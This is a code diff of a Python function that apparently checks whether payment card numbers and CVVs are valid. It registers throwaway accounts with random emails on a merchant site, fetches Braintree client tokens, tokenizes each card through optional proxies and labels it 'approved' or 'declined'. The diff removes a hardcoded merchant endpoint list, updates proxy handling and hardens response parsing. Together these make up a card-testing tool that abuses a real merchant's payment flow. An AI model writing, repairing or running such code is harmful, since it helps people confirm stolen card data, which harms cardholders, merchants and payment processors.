@@ -16,16 +16,6 @@ import httpx
 executor = ThreadPoolExecutor(max_workers=10)
 
 
-# Braintree endpoints for various merchants
-BRAINTREE_MERCHANTS = [
-    {
-        "name": "Pixorize",
-        "register_url": "https://apitwo.pixorize.com/users/register-simple",
-        "token_url": "https://apitwo.pixorize.com/braintree/token",
-    },
-]
-
-
 def generate_random_email() -> str:
     """Generate random email address."""
     chars = "abcdefghijklmnopqrstuvwxyz0123456789"
@@ -56,15 +46,14 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
             mes = f"0{mes}"
         
         # Setup proxy
-        proxies = None
+        proxy_url = None
         if proxy:
             proxy_url = proxy if proxy.startswith("http") else f"http://{proxy}"
-            proxies = {"http://": proxy_url, "https://": proxy_url}
         
         # Create client
         client = httpx.Client(
             timeout=60.0,
-            proxies=proxies,
+            proxy=proxy_url,
             follow_redirects=True
         )
         
@@ -114,7 +103,20 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
         
         try:
             token_data = response.json()
-            client_token = token_data['payload']['clientToken']
+            payload = token_data.get('payload')
+            if not payload:
+                client.close()
+                return {
+                    "status": "error",
+                    "response": "No payload in token response"
+                }
+            client_token = payload.get('clientToken')
+            if not client_token:
+                client.close()
+                return {
+                    "status": "error",
+                    "response": "No clientToken in payload"
+                }
             decoded = base64.b64decode(client_token).decode('utf-8')
             auth_fingerprint = json.loads(decoded)['authorizationFingerprint']
         except Exception as e:
@@ -235,32 +237,31 @@ def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Opt
             }
         
         # Check for successful tokenization with validation
-        if "data" in data and data["data"].get("tokenizeCreditCard"):
-            token_result = data["data"]["tokenizeCreditCard"]
-            
-            if token_result.get("token"):
+        if "data" in data and data["data"]:
+            tokenize_result = data["data"].get("tokenizeCreditCard")
+            if tokenize_result and tokenize_result.get("token"):
                 # Card was tokenized successfully with validation
-                cc_info = token_result.get("creditCard", {})
+                cc_info = tokenize_result.get("creditCard", {})
                 bin_data = cc_info.get("binData", {})
                 
-                bank = bin_data.get("issuingBank", "Unknown")
-                country = bin_data.get("countryOfIssuance", "Unknown")
-                brand = cc_info.get("brandCode", "Unknown")
+                bank = bin_data.get("issuingBank", "Unknown") or "Unknown"
+                country = bin_data.get("countryOfIssuance", "Unknown") or "Unknown"
+                brand = cc_info.get("brandCode", "Unknown") or "Unknown"
                 
                 return {
                     "status": "approved",
-                    "response": f"CVV VALID ✓ | {brand} | {bank[:25]}"
+                    "response": f"CVV VALID ✓ | {brand} | Bank: {bank[:20]}"
                 }
             else:
                 return {
                     "status": "declined",
-                    "response": "Tokenization Failed"
+                    "response": "Tokenization Failed - No Token"
                 }
         
         # Default decline for unknown response
         return {
             "status": "declined",
-            "response": f"Unknown: {str(data)[:60]}"
+            "response": f"Unknown Response"
         }
         
     except httpx.TimeoutException:
